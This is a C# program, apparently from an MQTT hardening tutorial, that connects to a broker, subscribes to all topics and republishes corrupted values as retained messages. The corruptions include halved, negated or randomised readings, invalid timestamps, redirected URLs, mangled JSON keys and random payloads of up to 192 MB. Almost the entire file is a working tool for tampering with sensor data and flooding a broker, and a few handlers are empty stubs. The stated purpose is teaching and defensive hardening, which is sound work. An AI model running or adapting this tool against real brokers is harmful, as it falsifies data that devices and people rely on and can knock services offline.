using System;
using System.Text;
using System.Threading.Tasks;
using Waher.Events.Console;
using Waher.Events;
using Waher.Networking.MQTT;
using Waher.Persistence;
using Waher.Persistence.Files;
using Waher.Runtime.Inventory.Loader;
using Waher.Runtime.Inventory;
using Waher.Runtime.Settings;
using System.Threading;
using Waher.Events.MQTT;
using Waher.Runtime.Queue;
using Waher.Content;
using System.Collections.Generic;
using System.ComponentModel.Design;
using System.Xml;
using Waher.Content.Xml;
using Waher.Runtime.Cache;
using Waher.Security;
using Microsoft.CodeAnalysis;
using Waher.Script.Constants;

namespace Troll
{
	/// <summary>
	/// This project implements a troll that tries to interrupt and destroy the communication between sensors and displays
	/// on an MQTT Broker. This project is presented for pedagogical reasons, and should only be used to help protect and
	/// harden services that use MQTT as a transport mechanism.
	/// 
	/// Note: Most of the program is written in linear fashion, so the reader can read as much as possible, from top to bottom, 
	/// without having to scroll or switch files.
	/// </summary>
	internal class Program
	{
		/// <summary>
		/// Program entry point
		/// </summary>
		static async Task Main()
		{
			FilesProvider DBProvider = null;
			MqttClient Mqtt = null;
			string DeviceID = string.Empty;

			try
			{

				#region Setup

				// First, initialize environment and type inventory. This creates an inventory of types used by the application.
				// This is important for tasks such as data persistence, for example.
				TypesLoader.Initialize();

				// Setup Event Output to Console window
				Log.Register(new ConsoleEventSink());
				Log.Informational("Troll application starting...");

				// Setup database
				Log.Informational("Setting up database...");
				DBProvider = await FilesProvider.CreateAsync("Database", "Default", 8192, 10000, 8192, Encoding.UTF8, 10000, true, false);
				Database.Register(DBProvider);

				// Repair database, if an inproper shutdown is detected
				await DBProvider.RepairIfInproperShutdown(string.Empty);

				// Starting internal modules
				await Types.StartAllModules(60000);

				#endregion

				#region Device ID

				// Configuring Device ID

				DeviceID = await RuntimeSettings.GetAsync("Device.ID", string.Empty);

				if (string.IsNullOrEmpty(DeviceID))
				{
					Console.Out.WriteLine("Device ID has not been configured. Please provide the Device ID that will be used by this application.");

					DeviceID = UserInput("Device ID", DeviceID);
					await RuntimeSettings.SetAsync("Device.ID", DeviceID);
				}
				else
					Log.Informational("Using Device ID: " + DeviceID, DeviceID);

				#endregion

				#region Connecting to MQTT Broker

				// Configuring and connecting to MQTT Server

				bool MqttConnected = false;

				do
				{
					// MQTT Configuration

					string MqttHost = await RuntimeSettings.GetAsync("MQTT.Host", string.Empty);
					int MqttPort = (int)await RuntimeSettings.GetAsync("MQTT.Port", 8883);
					bool MqttEncrypted = await RuntimeSettings.GetAsync("MQTT.Tls", true);
					string MqttUserName = await RuntimeSettings.GetAsync("MQTT.UserName", string.Empty);
					string MqttPassword = await RuntimeSettings.GetAsync("MQTT.Password", string.Empty);

					if (string.IsNullOrEmpty(MqttHost))
					{
						Console.Out.WriteLine("MQTT host not configured. Please provide the connection details below. If the default value presented is sufficient, just press ENTER.");

						MqttHost = UserInput("MQTT Host", MqttHost);
						await RuntimeSettings.SetAsync("MQTT.Host", MqttHost);

						MqttPort = UserInput("MQTT Port", MqttPort, 1, 65535);
						await RuntimeSettings.SetAsync("MQTT.Port", MqttPort);

						MqttEncrypted = (MqttPort == 8883);
						MqttEncrypted = UserInput("Encrypt with TLS", MqttEncrypted);
						await RuntimeSettings.SetAsync("MQTT.Tls", MqttEncrypted);

						MqttUserName = UserInput("MQTT UserName", MqttUserName);
						await RuntimeSettings.SetAsync("MQTT.UserName", MqttUserName);

						MqttPassword = UserInput("MQTT Password", MqttPassword);
						await RuntimeSettings.SetAsync("MQTT.Password", MqttPassword);
					}

					if (!(Mqtt is null))
					{
						await Mqtt.DisposeAsync();
						Mqtt = null;
					}

					// Connecting to broker and waiting for connection to complete

					Log.Informational("Connecting to MQTT Broker...", DeviceID);

					TaskCompletionSource<bool> WaitForConnect = new TaskCompletionSource<bool>();

					Mqtt = new MqttClient(MqttHost, MqttPort, MqttEncrypted, MqttUserName, MqttPassword);

					Mqtt.OnConnectionError += (_, e) =>
					{
						Log.Error(e.Message, DeviceID);
						WaitForConnect.TrySetResult(false);
						return Task.CompletedTask;
					};

					Mqtt.OnError += (_, e) =>
					{
						Log.Error(e.Message, DeviceID);
						return Task.CompletedTask;
					};

					Mqtt.OnStateChanged += (_, NewState) =>
					{
						Log.Informational(NewState.ToString(), DeviceID);

						switch (NewState)
						{
							case MqttState.Offline:
							case MqttState.Error:
								WaitForConnect.TrySetResult(false);
								break;

							case MqttState.Connected:
								WaitForConnect.TrySetResult(true);
								break;
						}

						return Task.CompletedTask;
					};

					MqttConnected = await WaitForConnect.Task;
				}
				while (!MqttConnected);

				#endregion

				#region Event Logging

				// Register MQTT event sink, allowing developer to follow what happens with devices.

				Log.Register(new MqttEventSink("MQTT Event Sink", Mqtt, "HardenMqtt/Events", true));
				Log.Informational("Troll connected to MQTT.", DeviceID);

				// Configure CTRL+Z to close application gracefully.

				#endregion

				#region CTRL-Z support

				CancellationTokenSource Operation = new CancellationTokenSource();
				AsyncQueue<MqttContent> InputQueue = new AsyncQueue<MqttContent>();

				Console.CancelKeyPress += (_, e) =>
				{
					e.Cancel = true;
					Operation.Cancel();
					InputQueue.Add(null);
				};

				#endregion

				#region Receiving Sensor Data

				Mqtt.OnContentReceived += (sender, e) =>
				{
					InputQueue.Add(e);
					return Task.CompletedTask;
				};

				Log.Informational("Subscribing to everything.", DeviceID);
				await Mqtt.SUBSCRIBE("#");

				#endregion

				#region Main loop

				Log.Informational("Troll application started... Press CTRL+C to terminate the application.", DeviceID);

				while (!Operation.IsCancellationRequested)
				{
					MqttContent e = await InputQueue.Wait();
					if (e is null)
						continue;

					try
					{
						string Digest = ComputeHash(e.Topic, e.Data);
						if (recentlySent.ContainsKey(Digest))
							continue;

						if (e.Data.Length > 65536)
							await TrollBlob(Mqtt, e.Topic, e.Data);
						else
						{
							string s = Encoding.UTF8.GetString(e.Data);

							if (long.TryParse(s, out long i))
								await TrollInteger(Mqtt, e.Topic, i);
							else if (CommonTypes.TryParse(s, out double d))
								await TrollDouble(Mqtt, e.Topic, d);
							else if (TimeSpan.TryParse(s, out TimeSpan TS))
								await TrollTimeSpan(Mqtt, e.Topic, TS);
							else if (DateTime.TryParse(s, out DateTime TP))
								await TrollDateTime(Mqtt, e.Topic, TP);
							else if (XML.TryParse(s, out TP))
								await TrollDateTime(Mqtt, e.Topic, TP);
							else if (Uri.TryCreate(s, UriKind.Absolute, out Uri Link))
								await TrollUri(Mqtt, e.Topic, Link);
							else if (TryParseJsonObject(s, out Dictionary<string, object> Object))
								await TrollObject(Mqtt, e.Topic, Object);
							else if (TryParseJsonArray(s, out Array Vector))
								await TrollArray(Mqtt, e.Topic, Vector);
							else if (TryParseXml(s, out XmlDocument Xml))
								await TrollXml(Mqtt, e.Topic, Xml);
							else
								await TrollString(Mqtt, e.Topic, s);
						}
					}
					catch (Exception ex)
					{
						Log.Critical(ex, DeviceID);
					}
				}

				#endregion
			}
			catch (Exception ex)
			{
				// Display exception terminating application
				Log.Alert(ex, DeviceID);
			}
			finally
			{
				// Shut down database gracefully

				Log.Informational("Troll application stopping...", DeviceID);

				if (!(Mqtt is null))
				{
					await Mqtt.DisposeAsync();
					Mqtt = null;
				}

				if (!(DBProvider is null))
					await DBProvider.Flush();

				await Types.StopAllModules();
				Log.Terminate();
			}
		}

		#region UserInput methods

		/// <summary>
		/// Asks the user to input a string.
		/// </summary>
		/// <param name="Label">Label</param>
		/// <param name="Default">Default value</param>
		/// <returns>User input</returns>
		private static string UserInput(string Label, string Default)
		{
			Console.Out.Write(Label);

			if (!string.IsNullOrEmpty(Default))
			{
				Console.Out.Write(" (default: ");
				Console.Out.Write(Default);
				Console.Out.Write(")");
			}

			Console.Out.Write(": ");

			string s = Console.In.ReadLine();

			if (string.IsNullOrEmpty(s))
				return Default;
			else
				return s;
		}

		/// <summary>
		/// Asks the user to input a Boolean value.
		/// </summary>
		/// <param name="Label">Label</param>
		/// <param name="Default">Default value</param>
		/// <returns>User input</returns>
		private static bool UserInput(string Label, bool Default)
		{
			string s;
			bool Result;

			do
			{
				s = UserInput(Label, Default.ToString());
			}
			while (!bool.TryParse(s, out Result));

			return Result;
		}

		/// <summary>
		/// Asks the user to input a 32-bit integer.
		/// </summary>
		/// <param name="Label">Label</param>
		/// <param name="Default">Default value</param>
		/// <param name="Min">Smallest permitted value.</param>
		/// <param name="Max">Largest permitted value.</param>
		/// <returns>User input</returns>
		private static int UserInput(string Label, int Default, int Min, int Max)
		{
			string s;
			int Result;

			do
			{
				s = UserInput(Label, Default.ToString());
			}
			while (!int.TryParse(s, out Result) || Result < Min || Result > Max);

			return Result;
		}

		#endregion

		#region Parsing Methods

		/// <summary>
		/// Tries to parse a string as a JSON object.
		/// </summary>
		/// <param name="s">String</param>
		/// <param name="Result">Parsed Object</param>
		/// <returns>If object could be parsed.</returns>
		private static bool TryParseJsonObject(string s, out Dictionary<string, object> Result)
		{
			Result = null;
			s = s.Trim();
			if (!s.StartsWith("{") || !s.EndsWith("}"))
				return false;

			try
			{
				object Parsed = JSON.Parse(s);
				Result = Parsed as Dictionary<string, object>;
				return !(Result is null);
			}
			catch
			{
				Result = null;
				return false;
			}
		}

		/// <summary>
		/// Tries to parse a string as a JSON array.
		/// </summary>
		/// <param name="s">String</param>
		/// <param name="Result">Parsed array</param>
		/// <returns>If array could be parsed.</returns>
		private static bool TryParseJsonArray(string s, out Array Result)
		{
			Result = null;
			s = s.Trim();
			if (!s.StartsWith("[") || !s.EndsWith("]"))
				return false;

			try
			{
				object Parsed = JSON.Parse(s);
				Result = Parsed as Array;
				return !(Result is null);
			}
			catch
			{
				Result = null;
				return false;
			}
		}

		/// <summary>
		/// Tries to parse a string as an XML document.
		/// </summary>
		/// <param name="s">String</param>
		/// <param name="Result">Parsed XML document</param>
		/// <returns>If document could be parsed.</returns>
		private static bool TryParseXml(string s, out XmlDocument Result)
		{
			Result = null;
			s = s.Trim();
			if (!s.StartsWith("<") || !s.EndsWith(">"))
				return false;

			try
			{
				XmlDocument Doc = new XmlDocument();
				Doc.LoadXml(s);

				Result = Doc;
				return true;
			}
			catch
			{
				Result = null;
				return false;
			}
		}

		#endregion

		#region Trolling

		/// <summary>
		/// Trolls recipients of BLOBs
		/// </summary>
		/// <param name="Mqtt">MQTT Client</param>
		/// <param name="Topic">Topic</param>
		/// <param name="Data">Data received on topic.</param>
		private static async Task TrollBlob(MqttClient Mqtt, string Topic, byte[] Data)
		{
			int c = Data.Length;

			switch (rnd.Next(6))
			{
				case 0: // Half size
					Array.Resize<byte>(ref Data, c / 2);
					await Publish(Mqtt, Topic, Data);
					break;

				case 1: // Double size
					Array.Resize<byte>(ref Data, c * 2);
					Array.Copy(Data, 0, Data, c, c);
					await Publish(Mqtt, Topic, Data);
					break;

				case 2: // Randomize
					rnd.NextBytes(Data);
					await Publish(Mqtt, Topic, Data);
					break;

				case 3: // 1 MB
					Data = new byte[1024 * 1024];
					rnd.NextBytes(Data);
					await Publish(Mqtt, Topic, Data);
					break;

				case 4: // 16 MB
					Data = new byte[16 * 1024 * 1024];
					rnd.NextBytes(Data);
					await Publish(Mqtt, Topic, Data);
					break;

				case 5: // 192 MB
					Data = new byte[192 * 1024 * 1024];
					rnd.NextBytes(Data);
					await Publish(Mqtt, Topic, Data);
					break;
			}
		}

		/// <summary>
		/// Trolls recipients of integers
		/// </summary>
		/// <param name="Mqtt">MQTT Client</param>
		/// <param name="Topic">Topic</param>
		/// <param name="i">Integer received on topic.</param>
		private static async Task TrollInteger(MqttClient Mqtt, string Topic, long i)
		{
			switch (rnd.Next(6))
			{
				case 0: // Half
					await Publish(Mqtt, Topic, (i / 2).ToString());
					break;

				case 1: // Double
					await Publish(Mqtt, Topic, (i * 2).ToString());
					break;

				case 2: // Negate
					await Publish(Mqtt, Topic, (-i).ToString());
					break;

				case 3: // Randomize
					await Publish(Mqtt, Topic, rnd.Next().ToString());
					break;

				case 4: // String
					await Publish(Mqtt, Topic, "Kilroy was here");
					break;

				case 5: // 1 MB
					byte[] Data = new byte[1024 * 1024];
					rnd.NextBytes(Data);
					await Publish(Mqtt, Topic, Data);
					break;
			}
		}

		private static async Task TrollDouble(MqttClient Mqtt, string Topic, double d)
		{
			switch (rnd.Next(7))
			{
				case 0: // Half
					await Publish(Mqtt, Topic, CommonTypes.Encode(d / 2));
					break;

				case 1: // Double
					await Publish(Mqtt, Topic, CommonTypes.Encode(d * 2));
					break;

				case 2: // Negate
					await Publish(Mqtt, Topic, CommonTypes.Encode(-d));
					break;

				case 3: // Randomize
					await Publish(Mqtt, Topic, CommonTypes.Encode(2 * d * rnd.NextDouble()));
					break;

				case 4: // Change format
					await Publish(Mqtt, Topic, d.ToString());
					break;

				case 5: // String
					await Publish(Mqtt, Topic, "Kilroy was here");
					break;

				case 6: // 1 MB
					byte[] Data = new byte[1024 * 1024];
					rnd.NextBytes(Data);
					await Publish(Mqtt, Topic, Data);
					break;
			}
		}

		private static async Task TrollTimeSpan(MqttClient Mqtt, string Topic, TimeSpan TS)
		{
			switch (rnd.Next(6))
			{
				case 0: // Half
					await Publish(Mqtt, Topic, TimeSpan.FromTicks(TS.Ticks / 2).ToString());
					break;

				case 1: // Double
					await Publish(Mqtt, Topic, TimeSpan.FromTicks(TS.Ticks * 2).ToString());
					break;

				case 2: // Negate
					await Publish(Mqtt, Topic, (-TS).ToString());
					break;

				case 3: // Randomize
					await Publish(Mqtt, Topic, TimeSpan.FromTicks((long)(2 * TS.Ticks * rnd.NextDouble())).ToString());
					break;

				case 4: // String
					await Publish(Mqtt, Topic, "Kilroy was here");
					break;

				case 5: // 1 MB
					byte[] Data = new byte[1024 * 1024];
					rnd.NextBytes(Data);
					await Publish(Mqtt, Topic, Data);
					break;
			}
		}

		private static async Task TrollDateTime(MqttClient Mqtt, string Topic, DateTime TP)
		{
			switch (rnd.Next(11))
			{
				case 0: // Half
					await Publish(Mqtt, Topic, XML.Encode(new DateTime(TP.Ticks / 2).ToString()));
					break;

				case 1: // Double
					await Publish(Mqtt, Topic, XML.Encode(new DateTime(TP.Ticks * 2).ToString()));
					break;

				case 2: // Invalid year
					await Publish(Mqtt, Topic,
						(TP.Year + 10).ToString("D4") + "-" +
						TP.Month.ToString("D2") + "-" +
						TP.Day.ToString("D2") + "T" +
						TP.Hour.ToString("D2") + ":" +
						TP.Minute.ToString("D2") + ":" +
						TP.Second.ToString("D2"));
					break;

				case 3: // Invalid month
					await Publish(Mqtt, Topic,
						TP.Year.ToString("D4") + "-" +
						(TP.Month + 10).ToString("D2") + "-" +
						TP.Day.ToString("D2") + "T" +
						TP.Hour.ToString("D2") + ":" +
						TP.Minute.ToString("D2") + ":" +
						TP.Second.ToString("D2"));
					break;

				case 4: // Invalid day
					await Publish(Mqtt, Topic,
						TP.Year.ToString("D4") + "-" +
						TP.Month.ToString("D2") + "-" +
						(TP.Day + 10).ToString("D2") + "T" +
						TP.Hour.ToString("D2") + ":" +
						TP.Minute.ToString("D2") + ":" +
						TP.Second.ToString("D2"));
					break;

				case 5: // Invalid hour
					await Publish(Mqtt, Topic,
						TP.Year.ToString("D4") + "-" +
						TP.Month.ToString("D2") + "-" +
						TP.Day.ToString("D2") + "T" +
						(TP.Hour + 10).ToString("D2") + ":" +
						TP.Minute.ToString("D2") + ":" +
						TP.Second.ToString("D2"));
					break;

				case 6: // Invalid minute
					await Publish(Mqtt, Topic,
						TP.Year.ToString("D4") + "-" +
						TP.Month.ToString("D2") + "-" +
						TP.Day.ToString("D2") + "T" +
						TP.Hour.ToString("D2") + ":" +
						(TP.Minute + 10).ToString("D2") + ":" +
						TP.Second.ToString("D2"));
					break;

				case 7: // Invalid second
					await Publish(Mqtt, Topic,
						TP.Year.ToString("D4") + "-" +
						TP.Month.ToString("D2") + "-" +
						TP.Day.ToString("D2") + "T" +
						TP.Hour.ToString("D2") + ":" +
						TP.Minute.ToString("D2") + ":" +
						(TP.Second + 10).ToString("D2"));
					break;

				case 8: // Randomize
					await Publish(Mqtt, Topic, XML.Encode(new DateTime((long)(2 * TP.Ticks * rnd.NextDouble()))));
					break;

				case 9: // String
					await Publish(Mqtt, Topic, "Kilroy was here");
					break;

				case 10: // 1 MB
					byte[] Data = new byte[1024 * 1024];
					rnd.NextBytes(Data);
					await Publish(Mqtt, Topic, Data);
					break;
			}
		}

		private static async Task TrollUri(MqttClient Mqtt, string Topic, Uri Link)
		{
			int c = Link.OriginalString.Length;

			switch (rnd.Next(6))
			{
				case 0: // Half
					await Publish(Mqtt, Topic, Link.OriginalString[0..(c / 2)]);
					break;

				case 1: // Change scheme
					UriBuilder b = new UriBuilder(Link)
					{
						Scheme = Link.Scheme + "x"
					};

					await Publish(Mqtt, Topic, b.Uri.ToString());
					break;

				case 2: // Change domain
					b = new UriBuilder(Link)
					{
						Host = "example.com"
					};

					await Publish(Mqtt, Topic, b.Uri.ToString());
					break;

				case 3: // Modify URL
					b = new UriBuilder(Link)
					{
						Path = Link.LocalPath + "/Kilroy"
					};

					await Publish(Mqtt, Topic, b.Uri.ToString());
					break;

				case 4: // String
					await Publish(Mqtt, Topic, "Kilroy was here");
					break;

				case 5: // 1 MB
					byte[] Data = new byte[1024 * 1024];
					rnd.NextBytes(Data);
					await Publish(Mqtt, Topic, Data);
					break;
			}
		}

		private static async Task TrollString(MqttClient Mqtt, string Topic, string s)
		{
			int c = s.Length;

			switch (rnd.Next(5))
			{
				case 0: // Half
					await Publish(Mqtt, Topic, s[0..(c / 2)]);
					break;

				case 1: // Double
					await Publish(Mqtt, Topic, s + s);
					break;

				case 2: // String
					await Publish(Mqtt, Topic, "Kilroy was here");
					break;

				case 3: // 1 kB
					byte[] Data = new byte[1024];
					rnd.NextBytes(Data);
					await Publish(Mqtt, Topic, Data);
					break;

				case 4: // 1 MB
					Data = new byte[1024 * 1024];
					rnd.NextBytes(Data);
					await Publish(Mqtt, Topic, Data);
					break;
			}
		}

		private static async Task TrollObject(MqttClient Mqtt, string Topic, Dictionary<string, object> Object)
		{
			Dictionary<string, object> Object2 = new Dictionary<string, object>();

			foreach (KeyValuePair<string, object> P in Object)
			{
				int c = P.Key.Length;

				switch (rnd.Next(5))
				{
					case 0: // Half key
						Object2[P.Key[0..(c / 2)]] = P.Value;
						break;

					case 1: // Double key
						Object2[P.Key + P.Key] = P.Value;
						break;

					case 2: // Random key
						byte[] Data = new byte[16];
						rnd.NextBytes(Data);
						Object2[Base64Url.Encode(Data)] = P.Value;
						break;

					case 3: // Ignore key
						break;

					case 4:
						Object2[P.Key] = TrollValue(P.Value);
						break;
				}
			}

			await Publish(Mqtt, Topic, JSON.Encode(Object2, false));
		}

		private static async Task TrollArray(MqttClient Mqtt, string Topic, Array Array)
		{
		}

		private static async Task TrollXml(MqttClient Mqtt, string Topic, XmlDocument Xml)
		{
		}

		private static object TrollValue(object Value)
		{
			return Value;	// TODO
		}

		private static async Task Publish(MqttClient Mqtt, string Topic, string Data)
		{
			await Publish(Mqtt, Topic, Encoding.UTF8.GetBytes(Data));
		}

		private static async Task Publish(MqttClient Mqtt, string Topic, byte[] Data)
		{
			string Digest = ComputeHash(Topic, Data);
			recentlySent[Digest] = true;

			await Mqtt.PUBLISH(Topic, MqttQualityOfService.AtMostOnce, true, Data);
			Console.Out.Write('.');
		}

		private static string ComputeHash(string Topic, byte[] Data)
		{
			byte[] Bin = Encoding.UTF8.GetBytes(Topic);
			int c = Bin.Length;
			int d = Data.Length;
			byte[] Data2 = new byte[c + d];

			Array.Copy(Bin, 0, Data2, 0, c);
			Array.Copy(Data, 0, Data2, c, d);

			return Hashes.ComputeSHA256HashString(Data2);
		}

		private static readonly Random rnd = new Random();
		private static readonly Cache<string, bool> recentlySent = new Cache<string, bool>(int.MaxValue, TimeSpan.FromMinutes(1), TimeSpan.FromMinutes(1));

		#endregion

	}
}
